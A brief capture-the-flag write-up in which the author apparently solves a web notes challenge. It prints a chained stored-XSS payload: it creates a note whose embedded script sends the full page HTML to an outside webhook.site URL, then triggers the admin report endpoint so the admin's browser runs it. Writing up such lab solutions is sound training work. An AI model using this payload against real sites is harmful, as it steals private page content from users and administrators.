# BABY DUCKY NOTES REVENGE 
i compared files with BABY DUCKY NOTES and the difference was in creating the database.. This task have admin  note with parametr HIDDEN: TRUE…

After 10h later i found….

i created xss script

```sql
<script>
const data = {title: "dziala",   content: "<script>\n  // Funkcja do wysyłania zawartości strony na webhook\n  function sendPageContentToWebhook(url) {\n    // Pobieramy zawartość strony\n    const pageContent = document.documentElement.outerHTML;\n\n    // Tworzymy nowy obiekt XMLHttpRequest\n    const xhr = new XMLHttpRequest();\n\n    // Ustawiamy metodę i adres URL żądania\n    xhr.open('POST', url, true);\n\n    // Ustawiamy nagłówki żądania, aby wysłać dane w formacie plain text\n    xhr.setRequestHeader('Content-Type', 'text/plain');\n\n    // Obsługa zdarzenia, gdy żądanie jest gotowe\n    xhr.onreadystatechange = function() {\n      if (xhr.readyState === XMLHttpRequest.DONE) {\n        // Obsługa odpowiedzi serwera (opcjonalne)\n        if (xhr.status === 200) {\n          console.log('Zawartość strony została wysłana na webhook.');\n        } else {\n          console.error('Błąd podczas wysyłania zawartości strony.');\n        }\n      }\n    };\n\n    // Wysyłamy żądanie z zawartością strony jako dane żądania\n    xhr.send(pageContent);\n  }\n\n  // Wywołujemy funkcję, przekazując adres URL webhooka\n  const webhookURL = 'https://webhook.site/8fc412cf-ca22-436f-98b5-388322118ecf/';\n  sendPageContentToWebhook(webhookURL);\n<\/script>"
, hidden: false};
fetch(`/api/posts`, {
			method: 'POST',
			headers: {
				'Content-Type': 'application/json',
			},
			body: JSON.stringify(data),
		})
</script>
<script>
fetch(`/api/report`, {
			method: 'POST'
		})
</script>

```

this script execute endpoint to create note on admin page and in this note i insert a next XSS but with gets content page and send to my webhook. and in last stage ADMIN send report. because He must review own view page and execute script.

